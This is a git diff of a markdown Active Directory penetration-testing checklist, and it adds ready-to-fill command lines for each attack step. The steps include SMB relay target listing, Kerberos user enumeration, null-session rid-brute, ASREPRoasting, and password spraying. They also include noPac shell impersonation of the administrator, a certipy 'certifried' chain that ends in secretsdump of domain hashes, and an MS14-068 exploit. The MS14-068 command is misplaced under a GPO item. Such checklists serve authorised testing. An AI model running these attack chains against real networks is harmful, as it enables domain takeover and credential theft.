@@ -8,7 +8,7 @@
 2. **AD pentesting**
 	1. **[Time Saving]** find targets without SMB signing enabled
 	```bash
-	crackmapexec smb <SUBNET> --gen-relay-list <OUT_FILE>
+	crackmapexec smb <SUBNET_RANGE> --gen-relay-list <OUT_FILE>
 	```
 	2. **[Time Saving + Network Poisoning]** start **`Responder`** and start relaying to target list ---> obtain AD naming convention to modify userlist
 	```bash
@@ -18,29 +18,85 @@
 	```bash
 	python3 evil_ssdp.py <NETWORK_INTERFACE> --template scanner
 	```
-	4. **[Identifing Domain Controllers]** Doing a quick **`nmap`** scan searching for DNS, Kerberos and LDAP ports: 53, 88, 389
-	5. **[Identifing Other High Value Targets]** Bruteforce DNS using subnet IPs to get a list of all server names --> set priority list for interesting host names
-	6. **[Time Saving + Username Enumeration]**
-		1. Start `kerbrute` using `userenum` module to enumerate AD users from OSINT-Generated wordlist
-		2. Try enumeration through **LDAP** using `ldapsearch` (checking if anonymous bind is enabled)
-		3. Try enumeration using **SMB** through guest/null/anonymous authention/rid-brute
-		4. Try enumeration through RPC using `enum4linux-ng`
-	7. **[Low-Hanging Fruit]** Test for CVEs on Domain Controller
+	4. **[Identifing Domain Controllers]** Doing a quick **`nmap`** scan searching for DNS, Kerberos or LDAP ports: 53, 88, 389
+	```bash
+	nmap -p53,88,389 --open <SUBNET_RANGE>
+	```
+	5. **[DNS Reconnaissance]** Do a reverse DNS lookup bruteforce to find other high-value targets **-->** set priority list for interesting host names
+	```bash
+	dnsrecon -d <DOMAIN_NAME> -n <SUBNET_RANGE>
+	```
+	6. **[Time Saving + Username/Share Enumeration]**
+		1. Enumerate **Kerberos** with OSINT-Generated wordlist (*shorten according to convention found with responder*)
+		```bash
+		kerbrute userenum -d <DOMAIN_NAME> --dc <DOMAIN_CONTROLLER> <WORDLIST>
+		```
+		2. Enumerate **LDAP** (checking if anonymous bind is enabled)
+		```bash
+		ldapsearch -x -H ldap://<TARGET_IP> -b 'DC=LAB,DC=LOCAL'
+		```
+		3. Enumerate **SMB** guest/null/anonymous authentication/rid-brute
+		```bash
+		cme smb <TARGET_IP> -u ''      -p '' --shares --rid-brute
+		cme smb <TARGET_IP> -u 'a'     -p '' --shares --rid-brute
+		cme smb <TARGET_IP> -u 'guest' -p '' --shares --rid-brute
+		```
+		4. Enumerate **RPC**
+		```bash
+		enum4linux-ng -A <TARGET_IP>
+		```
+	7. **[Low-Hanging Fruit | Domain Controllers/Other Windows Hosts]**
 		1. **Zero Logon** --> don't forget to restore password to avoid instability
-		2. Eternal blue or any other CVE
-	8. **[Low-Hanging Fruit]** Test for **Proxy Logon** (metasploit version) if exchange servers are found
-	9. **[Identifying High Value Targets + Low-Hanging Fruit]** Run `nmap` scan for port 80 --> `curl` for "http://SERVER_IP/certsrv" to detect **Active Directory Certificate Services** --> perform **PetitPotam Attack**
-	10. **[Unauthenticated AD Attacks 1 - ASREPRoasing]** got a userlist? --> **ASREPRoast**
-	11. **[Unauthenticated AD Attacks 2 - Password Spraying]** Try to obtain **Password Policy** `crackmapexec smb <DC_IP> -u '' -p '' --pass-pol` --> start spraying with most common passwords, trying usernames as passwords (`hydra`) & company-name convention passwords
+		2. Try Eternal Blue
+	8. **[Low-Hanging Fruit | Exchange]** Test for **Proxy Logon**
+	9. **[Identifying ADCS + Other Web Services]**
+		1. Run `nmap` scan for port 80
+		```bash
+		nmap --open -p 80,443 <SUBNET_RANGE> -oG web_services.txt
+		```
+		2. `curl` for the `certsrv` web directory --> perform **PetitPotam Attack**
+		```bash
+		curl -v http://<SERVER_IP>/certsrv
+		```
+	10. **[Unauthenticated AD Attacks | ASREPRoasing]** got a userlist? --> **ASREPRoast**
+	```bash
+	GetNPUsers.py -debug -dc-ip <DOMAIN_CONTROLLER_IP> -request -usersfile <FOUND_USERNAMES_LIST> <DOMAIN_NAME>/
+	```
+	11. **[Unauthenticated AD Attacks | Password Spraying]**
+		1. First, try to obtain the **Domain Password Policy**
+		```bash
+		crackmapexec smb <DC_IP> -u '' -p '' --pass-pol
+		```
+		2. Start spraying with:
+			1. Most common passwords
+			2. Usernames as passwords
+			3. Company-name conventions
 	12. **[Authenticated AD Attacks without shell access]**  
-		0. check for writable GPOs
-		0. Domain Controller <= Microsoft Server 2012 R2? --> MS14-068 (a.k.a pykek)
-		1. Search for **shell access** using `crackmapexec` modules for `smb` and `winrm`
-		2. **ADCS found?** --> use `noPac.py` + CVE-2022-26923 (a.k.a certifried)
+		1. Domain Controller <= Microsoft Server 2012 R2? --> MS14-068 (a.k.a pykek)
+		2. **ADCS found?**
+			1. check for **samAccountName spoofing**
+			```bash
+			python noPac.py <DOMAIN_NAME>/<USERNAME>:'<PASSWORD>' -dc-ip <DOMAIN_CONTROLLER_IP> -dc-host <DOMAIN_CONTROLLER_FQDN> -shell --impersonate administrator
+			```
+			2. CVE-2022-26923 (a.k.a certifried)
+			```bash
+			certipy account create <DOMAIN_FQDN>/<AD_USER>@<DC_IP> -user '<NEW_COMPUTER_NAME>' -dns <DC_FQDN>
+			certipy req -dc-ip <DC_IP> <DOMAIN_FQDN>/'<ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -ca <CA_NAME> -template Machine
+			certipy auth -pfx <GENERATED_PFX_CERTIFICATE>
+			secretsdump.py -just-dc <DOMAIN_FQDN>/'<DC_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -hashes :<RETRIEVED_HASH>
+			```
+		1. check for writable GPOs
+		```bash
+		python ms14-068.py -u <USERNAME>@<DOMAIN_NAME> -p <USER_PASSWORD> -s <USER_SID> -d <DOMAIN_CONTROLLER_IP>
+		```
+		3. Search for **shell access** using SMB/WinRM
+		```bash
+		cme smb <SUBNET_RANGE> -u <USERNAME> -p <PASSWORD>
+		cme winrm <SUBNET_RANGE> -u <USERNAME> -p <PASSWORD>
+		```
 		3. **MS Exchange found?** --> use `privexchange` relay attack to domain admin
 		4. **Drop the MIC** (CVE-2019-1040)
 		5. **Remote Print Nightmare** CVE-2021-1675
-		6. Test for **Pykek** vulnerability (MS14-068)
 		7. Retrieve all AD users
 			1. Do another full **ASREPRoast**
 			2. Check for **stored passwords** in user description field (`ldapdomaindump` or `Get-ADUser` from a RSAT-enabled & Network Authenticated user)
@@ -59,12 +115,12 @@
 				8. **Account Operators** --> modify group memberships --> exploit all above abilities from group memberships
 				9. **Server Operators** --> administrative access to non-domain controller servers
 			3. Locate computers where domain admins are logged in
+			4. Check for **readable LAPS passwords**
 		11. Enumerate **Group Policy Preferences** (MS14-025)
 		12. Enumerate **SMB** share access with the obtained user using `crackmapexec` `--shares` module
 			1. Passwords in files? --> search for keywords like "password" "creds" in readable files
 			2. writable SMB share? --> plant **SCF/LNK/INI** file/malicious office document (macro attack) with interesting name (*to attract a user to open it*)
 		13. Check for **Kerberos contrained/unconstrained delegation**
-		14. Check for **readable LAPS passwords**
 	13. **[Authenticated Attacks with shell/rdp access]** got user?
 		1. **[Local Privilege Escalation]** Run **WinPEAS** --> regular windows pricesc paths
 		2. **[Local Privilege Escalation]** `SeImpersonatePrivilege`? Abuse Potato attacks (SweetPotato)
